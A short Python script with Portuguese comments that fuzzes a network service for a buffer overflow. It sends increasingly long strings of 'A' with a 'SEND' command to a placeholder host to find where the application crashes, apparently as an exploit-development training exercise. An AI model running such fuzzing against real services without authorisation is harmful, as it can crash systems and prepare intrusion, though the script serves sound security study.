#!/usr/bin/python3
#Obter informações de retorno e comunicação da aplicação através do envio de dados para BoF
import socket
#envio de "A" para ver onde a aplicação quebra
lista = ["A"]
contador = 100

while len(lista) <= 50:
	lista.append("A"*contador)
	contador = contador + 100

for dados in lista:
	print ("Fuzzing com SEND %s bytes"%len(dados))
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("IP",port))
	s.recv(1024)
	s.send("SEND "+dados+"\r\n")
